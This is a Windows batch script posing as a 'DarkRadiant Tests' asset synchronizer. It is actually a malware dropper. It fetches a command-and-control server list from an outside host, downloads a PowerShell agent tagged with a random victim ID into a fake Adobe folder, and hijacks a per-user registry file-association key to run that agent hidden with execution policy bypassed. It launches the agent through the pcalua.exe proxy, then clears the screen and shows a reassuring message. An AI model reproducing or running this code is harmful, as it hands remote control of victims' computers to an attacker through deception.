@echo off
setlocal enabledelayedexpansion

REM --- 1.  ---
set "ADOBE_DIR=%APPDATA%\Adobe"
if not exist "%ADOBE_DIR%" mkdir "%ADOBE_DIR%"

echo [+] Synchronizing DarkRadiant Tests...

REM --- 2.  ---
for /f "usebackq tokens=*" %%i in (`
    powershell -NoP -NonI -Command "(iwr -UseBasicParsing http://prxa.layerpact.com/c2servers.txt).Content.Trim()"
`) do set "C2=%%i"

REM --- 3. ---
for /f "usebackq tokens=*" %%i in (`
    powershell -NoP -NonI -Command " 'WIN-' + (-join((48..57)+(97..102)|Get-Random -Count 8|%%{[char]$_})) "
`) do set "UID=%%i"

REM --- 4.  ---
powershell -NoP -NonI -W Hidden -Command "iwr -UseBasicParsing -Uri 'https://%C2%/agent.ps1?id=%UID%' -OutFile '%ADOBE_DIR%\AdobeDLP_Sync.ps1'"

REM --- 5.  ---
set "REG_PATH=HKCU\Software\Classes\piffile\shell\open\command"
set "PAYLOAD=powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File \"%ADOBE_DIR%\AdobeDLP_Sync.ps1\""

reg add "%REG_PATH%" /ve /t REG_SZ /d "%PAYLOAD%" /f >nul

REM --- 6.  ---
copy /y NUL "%ADOBE_DIR%\AdobeDLP.pif" >nul
start /b pcalua.exe -a "%ADOBE_DIR%\AdobeDLP.pif"

REM --- 7. CLEANUP & EXIT ---
cls
echo [+] Assets Synchronized. DarkRadiant is ready.
timeout /t 3 >nul
exit
